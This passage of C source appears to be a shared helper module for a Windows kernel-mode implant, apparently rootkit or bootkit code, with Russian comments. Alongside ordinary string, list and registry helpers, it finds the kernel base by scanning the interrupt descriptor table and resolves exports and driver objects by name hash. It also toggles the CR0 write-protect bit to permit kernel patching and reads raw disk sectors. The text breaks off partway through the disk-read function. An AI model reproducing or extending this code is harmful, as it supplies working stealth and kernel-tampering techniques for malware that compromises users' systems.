NTSTATUS common_wcscpy_s(NTSTRSAFE_PWSTR pszDest, size_t cchDest, NTSTRSAFE_PCWSTR pszSrc)
{
    NTSTATUS status = STATUS_SUCCESS;
    size_t cchToCopy = NTSTRSAFE_MAX_LENGTH;

    if ((cchDest == 0) || (cchDest > NTSTRSAFE_MAX_CCH)) {
        status = STATUS_INVALID_PARAMETER;
    }

    if (NT_SUCCESS(status))    {
        while (cchDest && cchToCopy && (*pszSrc != L'\0')) {
            *pszDest++ = *pszSrc++;
            cchDest--;
            cchToCopy--;
        }

        if (cchDest == 0) {
            // we are going to truncate pszDest
            pszDest--;

            status = STATUS_BUFFER_OVERFLOW;
        }

        *pszDest = L'\0';
    }

    return status;
}

NTSTATUS common_wcscat_s(NTSTRSAFE_PWSTR pszDest, size_t cchDest, NTSTRSAFE_PCWSTR pszSrc)
{
    NTSTATUS status = STATUS_SUCCESS;
    size_t cchDestLength = 0;
    NTSTRSAFE_PWSTR psz;

    if ((cchDest == 0) || (cchDest > NTSTRSAFE_MAX_CCH)) {
        status = STATUS_INVALID_PARAMETER;
    }

    if (NT_SUCCESS(status)) {
        cchDestLength = cchDest;
        psz = pszDest;

        while (cchDestLength && (*psz != L'\0')) {
            psz++;
            cchDestLength--;
        }

        if (cchDestLength == 0) {
            // the string is longer than cchMax
            status = STATUS_INVALID_PARAMETER;
        }

        if (NT_SUCCESS(status)) {
            cchDestLength = cchDest - cchDestLength;
        }        
    }

    if (NT_SUCCESS(status)) {
        cchDest -= cchDestLength;

        while (cchDest && (*pszSrc != L'\0')) {
            *psz++ = *pszSrc++;
            cchDest--;
        }

        pszDest += cchDestLength;

        if (cchDest == 0) {
            // we are going to truncate pszDest
            pszDest--;
            status = STATUS_BUFFER_OVERFLOW;
        }

        *psz = L'\0';
    }

    return status;
}

size_t common_wcslen_s(const wchar_t* pStr, size_t maxLength)
{
    size_t cchOriginalMax = maxLength;

    while (maxLength > 0 && (*pStr != L'\0')) {
        ++pStr;
        --maxLength;
    }

    if (maxLength != 0)
        return cchOriginalMax - maxLength;
    
    return 0;
}

void common_wcsupper_s(wchar_t* wstr, int sz)
{
    char ch;
    int i;

    for (i = 0; i < sz; ++i) {
        ch = (char)wstr[i];
        if (ch == '\0')
            break;

        if ((ch & 224) == 96)
            ch &= 223;

        wstr[i] = (wchar_t)ch;
    }
}

int common_wcscmp(wchar_t* wstr1, wchar_t* wstr2)
{
    for ( ; *wstr1 != L'\0' || *wstr2 != L'\0'; ) {
        if (*wstr1++ != *wstr2++) {
            return 1;
        }
    }

    if (*wstr1 != L'\0' || *wstr2 != L'\0') {
        return 1;
    }

    return 0;
}

size_t common_strlen_s(const char* pStr, size_t maxLength)
{
    size_t cchOriginalMax = maxLength;

    while (maxLength > 0 && (*pStr != '\0')) {
        ++pStr;
        --maxLength;
    }

    if (maxLength != 0)
        return cchOriginalMax - maxLength;
    
    return 0;
}

NTSTATUS common_strcpy_s(char* pszDest, size_t cchDest, const char* pszSrc)
{
    NTSTATUS status = STATUS_SUCCESS;
    size_t cchToCopy = NTSTRSAFE_MAX_LENGTH;

    if ((cchDest == 0) || (cchDest > NTSTRSAFE_MAX_CCH)) {
        status = STATUS_INVALID_PARAMETER;
    }

    if (NT_SUCCESS(status))    {
        while (cchDest && cchToCopy && (*pszSrc != '\0')) {
            *pszDest++ = *pszSrc++;
            cchDest--;
            cchToCopy--;
        }

        if (cchDest == 0) {
            // we are going to truncate pszDest
            pszDest--;

            status = STATUS_BUFFER_OVERFLOW;
        }

        *pszDest = '\0';
    }

    return status;
}

void common_strcat_s(char* pStr, size_t maxLength, const char* pDestStr)
{
    size_t len;    
    char* pDest;
    size_t remainLen;
    USE_GLOBAL_BLOCK

    len = pGlobalBlock->pCommonBlock->fncommon_strlen_s(pStr, maxLength);

    if (maxLength > len) {
        pDest = pStr + len;
        remainLen = maxLength - len;
        while (remainLen && (*pDestStr != '\0')) {
            *pDest++ = *pDestStr++;
            remainLen--;
        }

        if (remainLen == 0) {
            --pDest;
        }

        *pDest = '\0';
    }
}

NTSTATUS __cdecl common_printfA(NTSTRSAFE_PSTR pszDest, size_t cchDest, NTSTRSAFE_PCSTR pszFormat, ...)
{
    NTSTATUS status = STATUS_SUCCESS;
    int iRet;
    size_t cchMax;
    va_list argList;
    pmod_common_block_t pCommonBlock;
    USE_GLOBAL_BLOCK

    pCommonBlock = pGlobalBlock->pCommonBlock;

    va_start(argList, pszFormat);
    // leave the last space for the null terminator
    cchMax = cchDest - 1;

#pragma warning(push)
#pragma warning(disable: __WARNING_BANNED_API_USAGE)// "STRSAFE not included"
    iRet = pCommonBlock->fn_vsnprintf(pszDest, cchMax, pszFormat, argList);
#pragma warning(pop)
    // ASSERT((iRet < 0) || (((size_t)iRet) <= cchMax));

    if ((iRet < 0) || (((size_t)iRet) > cchMax)) {
        // need to null terminate the string
        pszDest += cchMax;
        *pszDest = '\0';

        // we have truncated pszDest
        status = STATUS_BUFFER_OVERFLOW;
    }
    else if (((size_t)iRet) == cchMax) {
        // need to null terminate the string
        pszDest += cchMax;
        *pszDest = '\0';
    }

    va_end(argList);

    return status;
}

int common_ansi_to_wide(const char* str, char* wstr, int sz)
{
    int str_len;
    int i, j = 0;
    USE_GLOBAL_BLOCK

    str_len = pGlobalBlock->pCommonBlock->fnstrlen(str);

    if (sz <= str_len) {
        return -1;
    }

    for (i = 0; i < str_len; i++) {
        wstr[j] = str[i];
        j++;
        wstr[j] = '\0';
        j++;
    }
    wstr[j] = '\0';
    j++;
    wstr[j] = '\0';
    j -= 2;
    return j;
}

int common_wide_to_ansi(const char* wstr, char* str, int ansiSize)
{
    int wideSize;
    int i, j = 0;
    USE_GLOBAL_BLOCK

    wideSize = (int)pGlobalBlock->pCommonBlock->fncommon_wcslen_s((const wchar_t*)wstr, NTSTRSAFE_MAX_LENGTH);
    
    if (ansiSize <= wideSize) {
        return -1;
    }

    for(i = 0; i < wideSize; i++) {
        str[i] = (char)wstr[j];
        j+=2;
    }
    str[i] = '\0';
    return i;
}

char* common_strstr(const char* str1, const char* str2)
{
    char* cp = (char*)str1;
    char *s1, *s2;

    if (!*str2)
        return (char*)str1;

    while (*cp != '\0') {
        s1 = cp;
        s2 = (char*)str2;

        while (*s1 && *s2 && !(*s1-*s2)) {
            s1++, s2++;
        }

        if (!*s2) {
            return cp;
        }

        cp++;
    }

    return NULL;
}

wchar_t* common_wcsstr(const wchar_t* str1, const wchar_t* str2)
{
    wchar_t* cp = (wchar_t*)str1;
    wchar_t *s1, *s2;

    if (!*str2)
        return (wchar_t*)str1;

    while (*cp != L'\0') {
        s1 = cp;
        s2 = (wchar_t*)str2;

        while (*s1 && *s2 && !(*s1-*s2)) {
            s1++, s2++;
        }

        if (!*s2) {
            return cp;
        }

        cp++;
    }

    return NULL;
}




// 
// NTSTRSAFEWORKERDDI
// RtlStringVPrintfWorkerW(
//                         __out_ecount(cchDest) NTSTRSAFE_PWSTR pszDest,
//                         __in __in_range(1, NTSTRSAFE_MAX_CCH) size_t cchDest,
//                         __out_opt __deref_out_range(<=, cchDest - 1) size_t* pcchNewDestLength,
//                         __in __format_string NTSTRSAFE_PCWSTR pszFormat,
//                         __in va_list argList)
// {
//     NTSTATUS status = STATUS_SUCCESS;
//     int iRet;
//     size_t cchMax;
//     size_t cchNewDestLength = 0;
// 
//     // leave the last space for the null terminator
//     cchMax = cchDest - 1;
// 
// #if (NTSTRSAFE_USE_SECURE_CRT == 1) && !defined(NTSTRSAFE_LIB_IMPL)
//     iRet = _vsnwprintf_s(pszDest, cchDest, cchMax, pszFormat, argList);
// #else
// #pragma warning(push)
// #pragma warning(disable: __WARNING_BANNED_API_USAGE)// "STRSAFE not included"
//     StringCchVPrintfW
//     iRet = _vsnwprintf(pszDest, cchMax, pszFormat, argList);
// #pragma warning(pop)
// #endif
//     // ASSERT((iRet < 0) || (((size_t)iRet) <= cchMax));
// 
//     if ((iRet < 0) || (((size_t)iRet) > cchMax)) {
//         // need to null terminate the string
//         pszDest += cchMax;
//         *pszDest = L'\0';
// 
//         cchNewDestLength = cchMax;
// 
//         // we have truncated pszDest
//         status = STATUS_BUFFER_OVERFLOW;
//     }
//     else if (((size_t)iRet) == cchMax) {
//         // need to null terminate the string
//         pszDest += cchMax;
//         *pszDest = L'\0';
// 
//         cchNewDestLength = cchMax;
//     }
//     else {
//         cchNewDestLength = (size_t)iRet;
//     }
// 
//     if (pcchNewDestLength) {
//         *pcchNewDestLength = cchNewDestLength;
//     }
// 
//     return status;
// }
// 
// NTSTATUS RtlStringCchPrintfW(__out_ecount(cchDest) NTSTRSAFE_PWSTR pszDest, __in size_t cchDest, __in __format_string NTSTRSAFE_PCWSTR pszFormat, ...)
// {
//     NTSTATUS status = STATUS_SUCCESS;
//     int iRet;
//     size_t cchMax;
//     size_t cchNewDestLength = 0;
//     va_list argList;
//     USE_GLOBAL_BLOCK
// 
//     va_start(argList, pszFormat);
// 
//     // leave the last space for the null terminator
//     cchMax = cchDest - 1;
// 
// #pragma warning(push)
// #pragma warning(disable: __WARNING_BANNED_API_USAGE)// "STRSAFE not included"
//     iRet = _vsnwprintf(pszDest, cchMax, pszFormat, argList);
// #pragma warning(pop)
// 
//     // ASSERT((iRet < 0) || (((size_t)iRet) <= cchMax));
// 
//     if ((iRet < 0) || (((size_t)iRet) > cchMax))
//     {
//         // need to null terminate the string
//         pszDest += cchMax;
//         *pszDest = L'\0';
// 
//         cchNewDestLength = cchMax;
// 
//         // we have truncated pszDest
//         status = STATUS_BUFFER_OVERFLOW;
//     }
//     else if (((size_t)iRet) == cchMax)
//     {
//         // need to null terminate the string
//         pszDest += cchMax;
//         *pszDest = L'\0';
// 
//         cchNewDestLength = cchMax;
//     }
//     else
//     {
//         cchNewDestLength = (size_t)iRet;
//     }
// 
//     if (pcchNewDestLength)
//     {
//         *pcchNewDestLength = cchNewDestLength;
//     }
// 
//     status = RtlStringVPrintfWorkerW(pszDest, cchDest, NULL, pszFormat, argList);
// 
//     va_end(argList);
// 
//     return status;
// }

#if BYTE_ORDER == LITTLE_ENDIAN

uint16_t htons(uint16_t x)
{
#ifdef _WIN64
    return ( ((x >> 8) & 0xFF) | ((x & 0xFF) << 8));
#else
    __asm {
        mov ax, x
        xchg al, ah
    }
#endif
}

uint32_t htonl(uint32_t x)
{
#ifdef _WIN64
    return ( ((x >> 24) & 0xFF) | ((x & 0x00FF0000) >> 8) | ((x & 0xFF00) << 8) | ((x & 0xFF) << 24) );
#else
    __asm {
        mov eax, x
        bswap eax
    }
#endif
}

#endif // BYTE_ORDER == LITTLE_ENDIAN


#ifdef _WIN64

extern uint32_t common_calc_hash(uint8_t* name, size_t sz);
extern void common_disable_wp();
extern void common_enable_wp();
extern uint8_t getCurrentProcessor();

#else

uint32_t common_calc_hash(uint8_t* name, size_t sz)
{
    __asm {
        xor eax, eax
        xor edx, edx
        mov esi, name
        mov ecx, sz
        cmp ecx, 0
        jz zero_based_calc
nextChar:
        lodsb
        or al, 20h
        ror edx, 11
        add edx, eax
        loop nextChar
        jmp complete_calc
zero_based_calc:
        lodsb
        cmp al, 0
        je complete_calc
        ror edx, 11
        add edx, eax
        jmp zero_based_calc
complete_calc:
        mov eax, edx
    }
}

void common_disable_wp()
{
    __asm {
        push ebx
        mov ebx, cr0
        and ebx, 0xfffeffff
        mov cr0, ebx
        pop ebx
    }
}

void common_enable_wp()
{
    __asm {
        push ebx
        mov ebx, cr0
        or ebx, 0x00010000
        mov cr0, ebx
        pop ebx
    }
}

uint8_t getCurrentProcessor()
{
    __asm {
        movzx eax, byte ptr fs:[0x51]
    }
}

#endif // _WIN64

#define USE_PE_FIND_EXPORT_BY_HASH 1
#include "../../../shared/ring0/pe.c"
#undef USE_PE_FIND_EXPORT_BY_HASH

uint8_t* findModuleBaseByInnerPtr(uint8_t* ptr)
{
    *(uint16_t*)(&ptr) &= 0xF000;
#ifdef _WIN64
    while (ptr > (uint8_t*)0xFFFF000000000000UI64) {
#else
    while (ptr > (uint8_t*)0x80000000) {
#endif
        if (*(uint16_t*)ptr == 0x5A4D && *(uint16_t*)(*(PUINT32)(ptr + 0x3C) + ptr) == 0x4550)
            return ptr;
        ptr -= 4096;
    }

    return NULL;
}

void* findModuleBaseFromIDT(PIDTR pIdtr, uint32_t hashVal, void** pAddr, FnfindModuleBaseByInnerPtr fnfindBaseByInnerPtr, Fnpe_find_export_by_hash fnfindPExportByHash, Fncommon_calc_hash fngetHash)
{
    int i, len;
    uint8_t* basePtr;
    PIDT_ENTRY pIdtEntry;

    // Ищем базу ядра через IDT таблицу
    // Алгоритм:
    // 1. Берём очередной элемент в IDT таблице и проверяем присутсвие бита Present, и соответствие GateType ~ Interrupt | Tarp
    // 2. Вычисляет адрес ISR
    // 3. Постранично спускаемся вниз в поиска сигнатуры MZ, ограничивая спуск до нижнего предела системной памяти (80000000h)
    // 4. При обнаружении сигнатуры MZ, проверяем наличие сигнатуры PE
    // 5. При обнаружении сигнатуры PE, возвращаем адрес базы
    len = pIdtr->limit / sizeof(IDT_ENTRY);

    for (i = 0; i <= len; ++i) {
        pIdtEntry = (PIDT_ENTRY)(pIdtr->addr + (i * sizeof(IDT_ENTRY)));

        if (pIdtEntry->p == 1) {
            if ((pIdtEntry->gateType & 6) == 6) {
#ifdef _WIN64
                basePtr = (uint8_t*)((uintptr_t)pIdtEntry->offset00_15 | ((uintptr_t)pIdtEntry->offset16_31 << 16) | ((uintptr_t)pIdtEntry->offset32_63 << 32));
#else
                basePtr = (uint8_t*)((uintptr_t)pIdtEntry->offset00_15 | ((uintptr_t)pIdtEntry->offset16_31 << 16));
#endif
                basePtr = fnfindBaseByInnerPtr(basePtr);
            }
        }

        *pAddr = fnfindPExportByHash(basePtr, hashVal, fngetHash);

        if (*pAddr != NULL)
            break;
    }

    return basePtr;
}

typedef struct _MODULE_ENTRY
{
    LIST_ENTRY link;        // Flink, Blink
    uint8_t unknown1[16];
    void* imageBase;
    void* entryPoint;
    ulong_t imageSize;
    UNICODE_STRING drvPath;
    UNICODE_STRING drvName;
    //...
} MODULE_ENTRY, *PMODULE_ENTRY;

typedef struct _DIRECTORY_BASIC_INFORMATION
{
    UNICODE_STRING ObjectName;
    UNICODE_STRING ObjectTypeName;
} DIRECTORY_BASIC_INFORMATION, *PDIRECTORY_BASIC_INFORMATION;

uint8_t* common_get_base_from_dirver_object(PDRIVER_OBJECT pDriverObject, uint32_t* pSize)
{
    uint8_t* moduleBase = NULL;
    PMODULE_ENTRY pModEntry = NULL;
    USE_GLOBAL_BLOCK

    moduleBase = (uint8_t*)pDriverObject->DriverStart;

    if (!pGlobalBlock->pCommonBlock->fnisValidPointer(moduleBase) ||  *(uint16_t*)moduleBase != 0x5A4D || *(uint16_t*)(*(PUINT32)(moduleBase + 0x3C) + moduleBase) != 0x4550) {
        if (pGlobalBlock->pCommonBlock->fnisValidPointer(pDriverObject->DriverInit)) {
            moduleBase = pGlobalBlock->pCommonBlock->fnfindModuleBaseByInnerPtr((uint8_t*)pDriverObject->DriverInit);
        }
        else {
            pModEntry = (PMODULE_ENTRY)pDriverObject->DriverSection;
            if (pGlobalBlock->pCommonBlock->fnisValidPointer(pModEntry) && pGlobalBlock->pCommonBlock->fnisValidPointer(pModEntry->imageBase)) {
                moduleBase = pModEntry->imageBase;
            }
        }

        if (*(uint16_t*)moduleBase != 0x5A4D || *(uint16_t*)(*(PUINT32)(moduleBase + 0x3C) + moduleBase) != 0x4550) {
            moduleBase = NULL;
        }
    }

    if (pSize != NULL && pGlobalBlock->pCommonBlock->fnisValidPointer(moduleBase)) {
        *pSize = ((PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)moduleBase)->e_lfanew + moduleBase))->OptionalHeader.SizeOfImage;
    }

    return moduleBase;
}

uint8_t* common_find_base_by_driver_name(uint32_t hashVal, uint32_t* pSize)
{
    NTSTATUS ntStatus;
    HANDLE hObjMgr = NULL;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING usDriverObj;
    HANDLE hObject = NULL;
    PDRIVER_OBJECT pDrvObj = NULL;
    char szBuffer[MAX_PATH];
    wchar_t wszObjName[MAX_PATH];
    PDIRECTORY_BASIC_INFORMATION pDirBasicInfo = NULL;
    ulong_t actualLen = 0;
    ulong_t curPos = 0;
    uint8_t* moduleBase = NULL;
    pmod_common_block_t pCommonBlock;
    USE_GLOBAL_BLOCK
    pCommonBlock = pGlobalBlock->pCommonBlock;

    if (pCommonBlock->fnisValidPointer(pSize)) {
        *pSize = 0;
    }

    // Открываем менеждер объектов
    pCommonBlock->fnRtlInitUnicodeString(&usDriverObj, pCommonBlock->driverWord);
    InitializeObjectAttributes(&objAttr, &usDriverObj, OBJ_CASE_INSENSITIVE, NULL, NULL);
    ntStatus = pCommonBlock->fnZwOpenDirectoryObject(&hObjMgr, DIRECTORY_QUERY | DIRECTORY_TRAVERSE, &objAttr);

    if (ntStatus == STATUS_SUCCESS) {            
        while(1) {
            // Get one object
            pCommonBlock->fnmemset(szBuffer, 0, MAX_PATH);
            ntStatus = pCommonBlock->fnZwQueryDirectoryObject(hObjMgr, szBuffer, MAX_PATH, TRUE, FALSE, &curPos, &actualLen);

            if (ntStatus == STATUS_SUCCESS) {
                //uint32_t fmt = 0x000A5325;
                // Extract the driver object name
                pDirBasicInfo = (PDIRECTORY_BASIC_INFORMATION)szBuffer;
                //pGlobalBlock->pCommonBlock->fnDbgPrint((const char*)&fmt/*"%S\n"*/, pDirBasicInfo->ObjectName.Buffer);
                if (pDirBasicInfo->ObjectName.Buffer != NULL && pCommonBlock->fncommon_calc_hash((uint8_t*)pDirBasicInfo->ObjectName.Buffer, pDirBasicInfo->ObjectName.Length) == hashVal) {
                    // Construct name
                    pCommonBlock->fnmemset(wszObjName, 0, sizeof(wchar_t) * MAX_PATH);
                    pCommonBlock->fncommon_wcscpy_s(wszObjName, MAX_PATH, pCommonBlock->driverWord);
                    wszObjName[7] = L'\\';
                    wszObjName[8] = 0;
                    pCommonBlock->fncommon_wcscat_s(wszObjName, MAX_PATH, pDirBasicInfo->ObjectName.Buffer);
                    pCommonBlock->fnRtlInitUnicodeString(&usDriverObj, wszObjName);
                    InitializeObjectAttributes(&objAttr, &usDriverObj, OBJ_CASE_INSENSITIVE, NULL, NULL);
                    // Open object
                    ntStatus = pCommonBlock->fnObOpenObjectByName(&objAttr, *pCommonBlock->pIoDriverObjectType, KernelMode, NULL, GENERIC_READ, NULL, &hObject);
                    if (ntStatus == STATUS_SUCCESS) {
                        // Get object from handle
                        ntStatus = pCommonBlock->fnObReferenceObjectByHandle(hObject, GENERIC_READ, NULL, KernelMode, &pDrvObj, NULL);
                        if (ntStatus == STATUS_SUCCESS) {
                            moduleBase = pGlobalBlock->pCommonBlock->fncommon_get_base_from_dirver_object(pDrvObj, pSize);

                            // Dereference the device object
                            pCommonBlock->fnObfDereferenceObject(pDrvObj);
                            pDrvObj = NULL;
                        }
                        pCommonBlock->fnZwClose(hObject);
                    }
                    break;
                }
            }
            else {
                break;
            }
        }
        pCommonBlock->fnZwClose(hObjMgr);
    }

    return moduleBase;
}

void common_fix_addr_value(uint8_t* pData, uint32_t size, uintptr_t oldValue, void* newValue)
{
    uint32_t p = 0;
    uintptr_t* pDD;
    while (p < size) {
        pDD = (uintptr_t*)(pData + p);
        if (*pDD == oldValue)
            *pDD = (uintptr_t)newValue;
        ++p;
    }
}

bool_t isValidPointer(void* ptr)
{
    USE_GLOBAL_BLOCK
#ifdef _WIN64
    return (ptr >= (void*)0xFFFF000000000000 && pGlobalBlock->pCommonBlock->fnMmIsAddressValid(ptr));
#else
    return (ptr >= (void*)0x80000000 && pGlobalBlock->pCommonBlock->fnMmIsAddressValid(ptr));
#endif
}

void common_allocate_memory(pmod_common_block_t pCommonBlock, void** ppVA, size_t size, POOL_TYPE poolType)
{
    LARGE_INTEGER delay;
    void* ptr;

    delay.QuadPart = -30000000I64;  // 3 секунды

    do {
        ptr  = pCommonBlock->fnExAllocatePoolWithTag(poolType, size, LOADER_TAG);
        if (ptr != NULL) {
            // Обнуляем память.
            __stosb(ptr, 0, size);
            *ppVA = ptr;
            break;
        }
        pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
    } while (TRUE);
}

int64_t common_atoi64(const char* str)
{
    int64_t val = 0;
    int64_t multiplier = 1;
    const char* head = str;
    const char* itr;
    int isSigned = (str[0] == '-');
    USE_GLOBAL_BLOCK

    if (isSigned) {
        head++; 
    }

    for (itr = head; *itr >= '0' && *itr <= '9'; ++itr);

    for ( ; --itr >= head; ) {
#ifndef _WIN64
        val += pGlobalBlock->pCommonBlock->fn_allmul(multiplier, (*itr - '0'));
        multiplier = pGlobalBlock->pCommonBlock->fn_allmul(multiplier, 10);
#else
        val += multiplier * (*itr - '0');
        multiplier = multiplier * 10;
#endif // _WIN64
        
    }

    return isSigned ? -val : val;
}

uint64_t common_atou64(const char* str, int maxDigits)
{
    uint64_t val = 0;
    uint64_t multiplier = 1;
    const char* head = str;
    const char* itr;
    int isSigned = (str[0] == '-');
    USE_GLOBAL_BLOCK

    if (isSigned) {
        return 0;
    }

    for (itr = head; *itr >= '0' && *itr <= '9' && maxDigits-- > 0; ++itr);

    for ( ; --itr >= head; ) {
#ifndef _WIN64
        val += pGlobalBlock->pCommonBlock->fn_allmul(multiplier, (*itr - '0'));
        multiplier = pGlobalBlock->pCommonBlock->fn_allmul(multiplier, 10);
#else
        val += multiplier * (*itr - '0');
        multiplier = multiplier * 10;
#endif // _WIN64
    }

    return val;
}

bool_t common_save_file(char* fileName, uint8_t* pData, ulong_t dataLen)
{
#define BLOCK_SIZE 16384
    NTSTATUS ntStatus;
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttrs;
    IO_STATUS_BLOCK ioStatus;
    UNICODE_STRING uFileName;
    ANSI_STRING aFileName;
    LARGE_INTEGER delay;
    ulong_t n, retries = 0, written = 0;
    pmod_common_block_t pCommonBlock;
    USE_GLOBAL_BLOCK

    pCommonBlock = pGlobalBlock->pCommonBlock;

    delay.QuadPart = -30000000I64;  // 3 секунды

//     nameLen = pCommonBlock->fncommon_get_string_length_a(fileName, 58);
// 
//     if (nameLen == 0)
//         return FALSE;
// 
//     fullName = pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, (UINT)nameLen + 8, LOADER_TAG);
    //pGlobalData->fnUtilsAllocateMemory(&fullName, (UINT)nameLen + 8);

//    if (fullName) {
//    pCommonBlock->fnmemcpy(fullName, pCommonBlock->pathBegin/*"\\??\\C:\\"*/, 8);
//    pCommonBlock->fncommon_string_cat_a(fullName, 63, fileName);

    pCommonBlock->fnRtlInitAnsiString(&aFileName, fileName);

    while (pCommonBlock->fnRtlAnsiStringToUnicodeString(&uFileName, &aFileName, TRUE) != STATUS_SUCCESS) {
        pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
    }

    InitializeObjectAttributes(&objAttrs, &uFileName, OBJ_CASE_INSENSITIVE, 0, NULL);

    // #define InitializeObjectAttributes( p, n, a, r, s ) { \
    //     (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    //     (p)->RootDirectory = r;                             \
    //     (p)->Attributes = a;                                \
    //     (p)->ObjectName = n;                                \
    //     (p)->SecurityDescriptor = s;                        \
    //     (p)->SecurityQualityOfService = NULL;               \
    //         }

    ntStatus = pCommonBlock->fnZwCreateFile(&hFile, FILE_WRITE_DATA + SYNCHRONIZE, &objAttrs, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE,
        FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

//    pCommonBlock->fnExFreePoolWithTag(fullName, LOADER_TAG);

    if (ntStatus == STATUS_SUCCESS) {
        while (1) {
            n = (dataLen - written) > BLOCK_SIZE ? BLOCK_SIZE : (dataLen - written);
            if (n == 0) {
                break;
            }
            ntStatus = pCommonBlock->fnZwWriteFile(hFile, 0, NULL, NULL, &ioStatus, pData + written, n, NULL, NULL);
            if (ntStatus != STATUS_SUCCESS) {
                ++retries;
                if (retries >= 7) {
                    break;
                }
                continue;
            }
            written += n;
        }

        pCommonBlock->fnZwClose(hFile);
    }

    pCommonBlock->fnRtlFreeUnicodeString(&uFileName);
//    }

    return written == dataLen;    
}

/// Registry ///////////////////////////////////////////////////////////////////////////////////////////////////////

NTSTATUS RegistryOpenKey(PHANDLE hReg, PUNICODE_STRING pKeyName)
{
    OBJECT_ATTRIBUTES objAttrs;
    USE_GLOBAL_BLOCK

    InitializeObjectAttributes(&objAttrs, pKeyName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    return pGlobalBlock->pCommonBlock->fnZwOpenKey(hReg, KEY_READ, &objAttrs);
}

// pValue - должен быть инициализирован
VOID RegistryReadValue(HANDLE hReg, PUNICODE_STRING pKeyValue, wchar_t* pValue)
{
    NTSTATUS ntStatus;
    KEY_VALUE_PARTIAL_INFORMATION valueInfo;
    ulong_t resultLength = 0;
    pmod_common_block_t pCommonBlock;
    USE_GLOBAL_BLOCK

    pCommonBlock = pGlobalBlock->pCommonBlock;

    ntStatus = pCommonBlock->fnZwQueryValueKey(hReg, pKeyValue, KeyValuePartialInformation, &valueInfo, sizeof(valueInfo), &resultLength);
    if (!NT_SUCCESS(ntStatus) && (ntStatus == STATUS_BUFFER_OVERFLOW)) {
        ulong_t valueInfoLength = valueInfo.DataLength + FIELD_OFFSET(KEY_VALUE_PARTIAL_INFORMATION, Data[0]);
        PKEY_VALUE_PARTIAL_INFORMATION valueInfoP;
        pCommonBlock->fncommon_allocate_memory(pCommonBlock, &valueInfoP, valueInfoLength, NonPagedPool);
        ntStatus = pCommonBlock->fnZwQueryValueKey(hReg, pKeyValue, KeyValuePartialInformation, valueInfoP, valueInfoLength, &resultLength);
        if (ntStatus == STATUS_SUCCESS) {
            pCommonBlock->fnmemcpy(pValue, valueInfoP->Data, valueInfoP->DataLength);
        }
        pCommonBlock->fnExFreePoolWithTag(valueInfoP, LOADER_TAG);
    }
}

VOID common_initialize_list_head(PLIST_ENTRY pListHead)
{
    pListHead->Flink = pListHead->Blink = pListHead;
}

bool_t common_is_list_empty(const PLIST_ENTRY pListHead)
{
    return (bool_t)(pListHead->Flink == pListHead);
}

bool_t common_remove_entry_list(PLIST_ENTRY pEntry)
{
    PLIST_ENTRY Blink;
    PLIST_ENTRY Flink;

    Flink = pEntry->Flink;
    Blink = pEntry->Blink;
    Blink->Flink = Flink;
    Flink->Blink = Blink;
    return (bool_t)(Flink == Blink);
}

PLIST_ENTRY common_remove_head_list(PLIST_ENTRY pListHead)
{
    PLIST_ENTRY Flink;
    PLIST_ENTRY Entry;

    Entry = pListHead->Flink;
    Flink = Entry->Flink;
    pListHead->Flink = Flink;
    Flink->Blink = pListHead;
    return Entry;
}

PLIST_ENTRY common_remove_tail_list(PLIST_ENTRY pListHead)
{
    PLIST_ENTRY Blink;
    PLIST_ENTRY Entry;

    Entry = pListHead->Blink;
    Blink = Entry->Blink;
    pListHead->Blink = Blink;
    Blink->Flink = pListHead;
    return Entry;
}

VOID common_insert_tail_list(PLIST_ENTRY pListHead, PLIST_ENTRY pEntry)
{
    PLIST_ENTRY Blink;

    Blink = pListHead->Blink;
    pEntry->Flink = pListHead;
    pEntry->Blink = Blink;
    Blink->Flink = pEntry;
    pListHead->Blink = pEntry;
}

VOID common_insert_head_list(PLIST_ENTRY pListHead, PLIST_ENTRY pEntry)
{
    PLIST_ENTRY Flink;

    Flink = pListHead->Flink;
    pEntry->Flink = Flink;
    pEntry->Blink = pListHead;
    Flink->Blink = pEntry;
    pListHead->Flink = pEntry;
}

VOID common_append_tail_list(PLIST_ENTRY pListHead, PLIST_ENTRY pListToAppend)
{
    PLIST_ENTRY ListEnd = pListHead->Blink;

    pListHead->Blink->Flink = pListToAppend;
    pListHead->Blink = pListToAppend->Blink;
    pListToAppend->Blink->Flink = pListHead;
    pListToAppend->Blink = ListEnd;
}

NTSTATUS common_dio_read_sector(pdisk_info_t pDiskInfo, void* pBuffer, uint32_t size, uint64_t offset)
{
    PIRP pIrp;
    PIO_STACK_LOCATION irpStack;
    NTSTATUS ntStatus = STATUS_INVALID_PARAMETER_2;
    IO_STATUS_BLOCK ioStatus;
    uint64_t realOffset;
    uint32_t realSize;
    uint32_t diffOffset = 0;
    uint8_t* pTmpBuff;
    KEVENT event;
    USE_GLOBAL_BLOCK

        if (pDiskInfo->pDeviceObject == NULL) {
            return STATUS_INVALID_PARAMETER_1;
        }

        if (
#ifdef _WIN64
            (offset % pDiskInfo->bytesPerSector)
#else
            pGlobalBlock->pCommonBlock->fn_aullrem(offset, pDiskInfo->bytesPerSector)
#endif // _WIN64
            || (size % pDiskInfo->bytesPerSector)) {
#ifdef _WIN64
            diffOffset = offset % pDiskInfo->bytesPerSector;
#else
            diffOffset = (uint32_t)pGlobalBlock->pCommonBlock->fn_aullrem(offset, pDiskInfo->bytesPerSector);
#endif // _WIN64
            realOffset = offset - diffOffset;
            realSize = size + diffOffset;
#ifdef _WIN64
            realSize = realSize + (pDiskInfo->bytesPerSector - (realSize % pDiskInfo->bytesPerSector));
#else
            realSize = realSize + (pDiskInfo->bytesPerSector - (uint32_t)pGlobalBlock->pCommonBlock->fn_aullrem(realSize, pDiskInfo->bytesPerSector));
#endif // _WIN64
            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pTmpBuff, realSize, NonPagedPool);
        }
        else {
            realOffset = offset;
            realSize = (uint32_t)size;
            pTmpBuff = (uint8_t*)pBuffer;
        }

        do {
            if (pTmpBuff == NULL) {
                break;
            }

